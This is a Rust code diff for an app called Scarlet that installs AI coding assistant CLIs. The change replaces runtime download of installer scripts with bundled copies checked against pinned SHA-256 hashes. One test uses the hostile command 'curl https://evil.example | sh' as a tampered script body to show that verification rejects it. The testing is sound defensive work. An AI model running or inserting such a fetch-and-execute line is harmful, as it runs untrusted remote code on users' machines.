@@ -2,6 +2,7 @@ use std::collections::HashMap;
 use std::path::Path;
 use std::time::Duration;
 
+use sha2::{Digest, Sha256};
 use tokio::sync::Mutex;
 use tokio_util::sync::CancellationToken;
 
@@ -9,31 +10,74 @@ use super::detect::cli_binary;
 use super::spawn::{find_on_path, spawn_lines, SpawnLinesOptions};
 use crate::util::{assistant_prefix, child_env};
 
+/// An official installer script, shipped inside Scarlet as a reviewed copy. Scarlet never runs a script it just
+/// downloaded: it runs this copy, and only if its SHA-256 still matches the one pinned here. The scripts themselves
+/// check the checksum of the program they download. To update a script, see `installers/README.md`.
+struct InstallerScript {
+    /// Where the copy came from, for the log and for refreshing it.
+    source: &'static str,
+    body: &'static str,
+    sha256: &'static str,
+}
+
 struct NativeInstaller {
     label: &'static str,
-    sh_url: &'static str,
-    ps1_url: &'static str,
+    sh: InstallerScript,
+    ps1: InstallerScript,
 }
 
 fn native_installer(agent: &str) -> Option<NativeInstaller> {
     match agent {
         "claude" => Some(NativeInstaller {
             label: "Claude Code",
-            sh_url: "https://claude.ai/install.sh",
-            ps1_url: "https://claude.ai/install.ps1",
+            sh: InstallerScript {
+                source: "https://claude.ai/install.sh",
+                body: include_str!("../../installers/claude.sh"),
+                sha256: "2c5506d110560bf618bbe88f678f2c2a0047c86a9c6585fc84976120b1de0b44",
+            },
+            ps1: InstallerScript {
+                source: "https://claude.ai/install.ps1",
+                body: include_str!("../../installers/claude.ps1"),
+                sha256: "cd17c6b555f761d60373659824bf805e1510538226e4c7028e19d7494937a333",
+            },
         }),
         "codex" => Some(NativeInstaller {
             label: "Codex",
-            sh_url: "https://chatgpt.com/codex/install.sh",
-            ps1_url: "https://chatgpt.com/codex/install.ps1",
+            sh: InstallerScript {
+                source: "https://chatgpt.com/codex/install.sh",
+                body: include_str!("../../installers/codex.sh"),
+                sha256: "b698d8eb50c0fbe0214ea57b5bf2af439054108404c6d2b872989db02f4bd574",
+            },
+            ps1: InstallerScript {
+                source: "https://chatgpt.com/codex/install.ps1",
+                body: include_str!("../../installers/codex.ps1"),
+                sha256: "73e757c5067d2bcafa0d1b6df78b498f0a13d890be642c8dc2e3860b37e3d57b",
+            },
         }),
         "gemini" => Some(NativeInstaller {
             label: "Gemini",
-            sh_url: "https://antigravity.google/cli/install.sh",
-            ps1_url: "https://antigravity.google/cli/install.ps1",
+            sh: InstallerScript {
+                source: "https://antigravity.google/cli/install.sh",
+                body: include_str!("../../installers/gemini.sh"),
+                sha256: "62966c07365423bd4dc209355060744058fb30d60f5323e2d360e39de64e5042",
+            },
+            ps1: InstallerScript {
+                source: "https://antigravity.google/cli/install.ps1",
+                body: include_str!("../../installers/gemini.ps1"),
+                sha256: "51c2cb4fada22ce0228da71b9506370383d6544bfebcec85fe7616a52b805344",
+            },
         }),
         _ => None,
     }
+}
+
+fn sha256_hex(bytes: &[u8]) -> String {
+    Sha256::digest(bytes).iter().map(|b| format!("{b:02x}")).collect()
+}
+
+/// The script's body, if it is still exactly the reviewed copy.
+fn verified_body(script: &InstallerScript) -> Option<&'static str> {
+    (sha256_hex(script.body.as_bytes()) == script.sha256).then_some(script.body)
 }
 
 // Serialize assistant installs so shared directories/prefixes are never raced.
@@ -119,7 +163,8 @@ async fn install_via_npm(
     Ok(InstallResult::Installed)
 }
 
-/// Install a standalone native assistant CLI via its official HTTPS installer script (no Node.js required).
+/// Install a standalone native assistant CLI with Scarlet's reviewed copy of its official installer script (no Node.js
+/// required). The script downloads the program over HTTPS and checks its checksum.
 async fn install_via_script(
     agent: &str,
     binary: &str,
@@ -127,29 +172,14 @@ async fn install_via_script(
     home: &Path,
     env: HashMap<String, String>,
 ) -> Result<InstallResult, String> {
-    let url = if cfg!(windows) { installer.ps1_url } else { installer.sh_url };
+    let copy = if cfg!(windows) { &installer.ps1 } else { &installer.sh };
     let label = installer.label;
-    log::info!("installing {agent} ({label}) from {url}");
-    let client = reqwest::Client::builder()
-        .https_only(true)
-        .timeout(Duration::from_secs(60))
-        .build()
-        .map_err(|e| {
-            log::warn!("cannot install {agent}: HTTP client error: {e}");
-            "Installation did not finish. Check your connection and try again.".to_string()
-        })?;
-    let response = client.get(url).send().await.map_err(|e| {
-        log::warn!("cannot install {agent}: failed to download installer: {e}");
-        format!("Could not download the {label} installer. Check your connection and try again.")
-    })?;
-    if !response.status().is_success() {
-        log::warn!("cannot install {agent}: installer download returned {}", response.status());
-        return Err(format!("Could not download the {label} installer. Check your connection and try again."));
-    }
-    let script = response.text().await.map_err(|e| {
-        log::warn!("cannot install {agent}: failed to read installer script: {e}");
-        format!("Could not download the {label} installer. Check your connection and try again.")
-    })?;
+    let source = copy.source;
+    let Some(script) = verified_body(copy).map(str::to_string) else {
+        log::error!("cannot install {agent}: Scarlet's copy of {source} does not match its pinned SHA-256");
+        return Err(format!("Scarlet’s copy of the {label} installer failed its safety check. Reinstall Scarlet and try again."));
+    };
+    log::info!("installing {agent} ({label}) with Scarlet's checked copy of {source}");
     let prefix = assistant_prefix(home);
     let restricted_env = install_env(env, &prefix);
 
@@ -259,9 +289,20 @@ mod tests {
         assert_eq!(npm_package("gemini"), None);
         for agent in ["claude", "codex", "gemini"] {
             let native = native_installer(agent).expect("all supported assistants have standalone native installers");
-            assert!(native.sh_url.starts_with("https://"), "{agent} sh_url must be https");
-            assert!(native.ps1_url.starts_with("https://"), "{agent} ps1_url must be https");
+            for script in [&native.sh, &native.ps1] {
+                assert!(script.source.starts_with("https://"), "{agent}: {} must be https", script.source);
+                // A changed copy must be reviewed and its pin updated on purpose (installers/README.md).
+                assert_eq!(sha256_hex(script.body.as_bytes()), script.sha256, "{agent}: {} changed", script.source);
+                assert_eq!(verified_body(script), Some(script.body));
+            }
         }
+    }
+
+    #[test]
+    fn refuses_a_script_that_does_not_match_its_pin() {
+        let real = native_installer("claude").unwrap().sh;
+        let changed = InstallerScript { body: "curl https://evil.example | sh", ..real };
+        assert_eq!(verified_body(&changed), None);
     }
 
     #[test]
